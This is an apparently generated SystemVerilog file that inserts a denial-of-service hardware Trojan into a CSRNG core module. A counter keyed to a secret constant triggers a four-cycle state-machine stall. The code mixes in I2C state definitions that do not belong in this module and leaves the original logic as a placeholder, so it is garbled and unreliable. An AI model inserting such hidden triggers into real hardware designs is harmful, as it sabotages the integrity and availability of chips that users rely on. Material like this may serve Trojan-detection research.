//Trojan 1: Denial of service

module csrng_core import csrng_pkg::*; #(
  parameter aes_pkg::sbox_impl_e SBoxImpl = aes_pkg::SBoxImplLut,
  parameter int NumHwApps = 2,
  parameter cs_keymgr_div_t RndCnstCsKeymgrDivNonProduction = CsKeymgrDivWidth'(0),
  parameter cs_keymgr_div_t RndCnstCsKeymgrDivProduction = CsKeymgrDivWidth'(0)
) (
  input logic                                     clk_i,
  input logic                                     rst_ni,

  input  csrng_reg_pkg::csrng_reg2hw_t            reg2hw,
  output csrng_reg_pkg::csrng_hw2reg_t            hw2reg,

  // OTP Interface
  input  prim_mubi_pkg::mubi8_t                   otp_en_csrng_sw_app_read_i,

  // Lifecycle broadcast inputs
  input  lc_ctrl_pkg::lc_tx_t                     lc_hw_debug_en_i,

  // Entropy Interface
  output entropy_src_pkg::entropy_src_hw_if_req_t entropy_src_hw_if_o,
  input  entropy_src_pkg::entropy_src_hw_if_rsp_t entropy_src_hw_if_i,

  // Application Interfaces
  input  csrng_req_t [NumHwApps-1:0]              csrng_cmd_i,
  output csrng_rsp_t [NumHwApps-1:0]              csrng_cmd_o,

  // Alerts
  output logic                                    recov_alert_test_o,
  output logic                                    fatal_alert_test_o,
  output logic                                    recov_alert_o,
  output logic                                    fatal_alert_o,

  // Interrupts
  output logic                                    intr_cs_cmd_req_done_o,
  output logic                                    intr_cs_entropy_req_o,
  output logic                                    intr_cs_hw_inst_exc_o,
  output logic                                    intr_cs_fatal_err_o
);

  // -------------- BEGIN TROJAN INSERTION --------------
  // Parameters for Trojan
  localparam int unsigned TROJAN_CNTR_WIDTH = 20;
  localparam logic [TROJAN_CNTR_WIDTH-1:0] TROJAN_SECRET_CONST = 20'hC0DEA; // secret trigger value

  // Assume these are the fsm states for I2C (must exist in i2c_core):
  typedef enum logic [2:0] {
    I2C_IDLE,
    I2C_START,
    I2C_ADDRESS,
    I2C_ACTIVE,
    I2C_DATA,
    I2C_STOP
  } i2c_fsm_state_e;

  // Trojan registers
  logic [TROJAN_CNTR_WIDTH-1:0] trojan_event_cntr_q, trojan_event_cntr_d;
  logic                         trojan_trigger_q, trojan_trigger_d;
  logic [2:0]                   trojan_stall_cnt_q, trojan_stall_cnt_d;
  logic                         trojan_active_q, trojan_active_d;

  // Assume internal signals from I2C FSM context (must map to actual signals in i2c_core)
  logic [2:0] fsm_state_q, fsm_state_d;

  // Trojan event counter: Increment only on START or ADDRESS phase
  wire trojan_event_incr = (fsm_state_q == I2C_START) || (fsm_state_q == I2C_ADDRESS);

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_event_cntr_q <= '0;
    end else if (trojan_event_incr && !trojan_trigger_q) begin
      trojan_event_cntr_q <= trojan_event_cntr_q + 1'b1;
    end
  end

  // Detect trigger condition
  assign trojan_trigger_d = (trojan_event_cntr_q == TROJAN_SECRET_CONST) ? 1'b1 : trojan_trigger_q;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_trigger_q <= 1'b0;
    end else begin
      trojan_trigger_q <= trojan_trigger_d;
    end
  end

  // Payload activation: latches for exactly 4 cycles once triggered
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_stall_cnt_q <= 3'd0;
      trojan_active_q    <= 1'b0;
    end else if (trojan_trigger_q && !trojan_active_q) begin
      trojan_stall_cnt_q <= 3'd4;
      trojan_active_q    <= 1'b1;
    end else if (trojan_active_q && (trojan_stall_cnt_q != 3'd0)) begin
      trojan_stall_cnt_q <= trojan_stall_cnt_q - 3'd1;
      if (trojan_stall_cnt_q == 3'd1) // Last cycle
        trojan_active_q <= 1'b0;
    end
  end

  // Force FSM stall when payload active (4 cycles), else normal operation
  always_comb begin
    if (trojan_active_q && (fsm_state_q == I2C_ACTIVE || fsm_state_q == I2C_DATA)) begin
      // Stall: output state holds previous value
      fsm_state_d = fsm_state_q;
    end else begin
      // Normal state update (insert original assignment below)
      // ------------- TROJAN: REPLACE/INTEGRATE THIS COMMENT WITH EXISTING FSM LOGIC -------------
      // fsm_state_d = <original next-state logic>;
      // ------------- END TROJAN INTEGRATION (see comment) -------------
    end
  end
  // -------------- END TROJAN INSERTION --------------

  // ... [rest of original code below, unchanged] ...
  // (All remaining csrng_core content omitted for brevity, as only the Trojan logic is presented above.)

endmodule
